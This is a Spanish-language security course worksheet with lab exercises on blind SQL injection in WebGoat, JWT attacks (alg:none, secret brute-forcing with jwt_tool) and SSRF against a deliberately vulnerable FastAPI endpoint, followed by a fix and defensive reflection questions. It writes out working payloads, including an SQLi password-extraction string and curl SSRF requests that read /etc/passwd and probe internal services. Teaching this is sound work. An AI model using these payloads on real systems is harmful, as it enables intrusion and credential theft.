# Practica — Semana 5: Ataques en profundidad

---

## Ejercicio 1 — SQLi avanzado en WebGoat (obligatorio)

Completa en WebGoat:
1. `SQL Injection (advanced)` — secciones de Blind SQL Injection
2. `SQL Injection (mitigation)` — las primeras 3 lecciones

**Parte practica — Blind SQLi manual:**

Con WebGoat corriendo, en el modulo de Blind SQL Injection:

```
# Boolean-based — determinar si el primer caracter de la password es 'a'
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

# Si la pagina se comporta diferente → 'a' es correcto
# Si no → probar 'b', 'c', etc.
```

**Responde:**
a) Cuantos caracteres tiene la tabla `users` en WebGoat? (usa `LENGTH()`)
b) Extrae al menos los primeros 3 caracteres de la password del admin usando Blind SQLi
c) Cuantos requests necesitas para extraer 1 caracter? Cuantos para una password de 8 caracteres?
d) Como funciona sqlmap para automatizar esto?

---

## Ejercicio 2 — JWT Attack manual (obligatorio)

**Parte A — Decodificar JWT:**

```python
import base64, json

token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sIjoidXNlciJ9.firma"
partes = token.split(".")

# Decodificar header y payload (agregar padding si es necesario)
def decode_part(part):
    padding = 4 - len(part) % 4
    if padding != 4:
        part += "=" * padding
    return json.loads(base64.urlsafe_b64decode(part))

print("Header:", decode_part(partes[0]))
print("Payload:", decode_part(partes[1]))
```

Ejecuta este codigo con tu propio token JWT (si tienes FastAPI corriendo del Curso 2).

**Parte B — Algorithm None Attack (laboratorio WebGoat):**

En WebGoat, ir a `JWT tokens`:
1. Completar la leccion de "JWT tokens"
2. Intentar el ataque de "alg: none"

**Documenta:**
- El token original (header+payload decodificados)
- El token modificado que usaste
- Que permitio hacer el ataque?
- Como se previene?

**Parte C — Brute force del secreto JWT:**

```bash
# En Kali, con jwt_tool
pip3 install jwt-tool

# Si tienes un token y sospechas que el secreto es debil
python3 jwt_tool.py eyJ... -C -d /usr/share/wordlists/rockyou.txt
```

Prueba con un JWT tuyo usando secretos debiles como "secret", "password", "123456".

---

## Ejercicio 3 — Reto: SSRF en laboratorio (reto)

**Configuracion:**

```bash
# App vulnerable simple (puedes crearla tu)
cat > ssrf_vuln.py << 'EOF'
from fastapi import FastAPI
import requests

app = FastAPI()

@app.get("/preview")
async def preview(url: str):
    """VULNERABLE — no valida la URL"""
    try:
        response = requests.get(url, timeout=3)
        return {"content": response.text[:500], "status": response.status_code}
    except Exception as e:
        return {"error": str(e)}
EOF

uvicorn ssrf_vuln:app --port 9000
```

**Ataques a probar (solo en localhost):**

```bash
# Acceso a metadata (simular AWS)
curl "http://localhost:9000/preview?url=http://localhost:9000"

# Intentar acceder a servicios internos
curl "http://localhost:9000/preview?url=http://localhost:5432"    # PostgreSQL
curl "http://localhost:9000/preview?url=http://localhost:6379"    # Redis

# File protocol (si el servidor lo permite)
curl "http://localhost:9000/preview?url=file:///etc/passwd"
```

**Ahora arregla la vulnerabilidad:**

```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = ["example.com", "api.github.com"]

@app.get("/preview/seguro")
async def preview_seguro(url: str):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise HTTPException(400, "Dominio no permitido")
    if parsed.scheme not in ["http", "https"]:
        raise HTTPException(400, "Protocolo no permitido")
    # ... hacer el request
```

Documenta: que dominios puede acceder un atacante con SSRF? Por que es critico en AWS?

---

## Reflexion semanal

1. De todos los ataques de esta semana, cual te parece el mas dificil de detectar desde el Blue Team?
2. Si eres desarrolladora, que cambio harias hoy en tu API para prevenir los 3 ataques de esta semana?
3. El "algorithm none" JWT attack — como llego a existir esa vulnerabilidad? (reflexion sobre diseno de librerias)
4. En AWS, si un servidor tiene SSRF vulnerable, como podria comprometer toda la cuenta de AWS?
